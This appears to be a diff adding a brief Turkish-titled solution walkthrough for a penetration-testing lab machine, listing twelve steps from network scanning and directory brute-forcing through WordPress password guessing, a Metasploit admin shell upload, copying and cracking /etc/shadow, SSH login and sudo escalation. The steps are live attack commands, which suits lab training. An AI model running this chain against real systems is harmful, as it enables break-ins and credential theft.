@@ -1,0 +1,12 @@
+BASİC PENETRATİON MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.91 bulundu.
+2 - nmap -sT -A 192.168.2.91
+3 - gobuster dir -u http://192.168.2.91 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.91/secret/, nano /etc/hosts
+5 - wpscan --url http://192.168.2.91/secret/ -e u
+6 - wpscan --url http://192.168.2.91/secret/ -e p  --usernames admin --passwords /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+7 - msfconsole, search wp_admin, use exploit/unix/webapp/wp_admin_shell_upload/
+8 - cat /etc/shadow, download /etc/shadow
+9 - john shadow, marlinspike:marlinspike
+10 - ssh marlinspike@192.168.2.91
+11 - sudo -l, sudo su
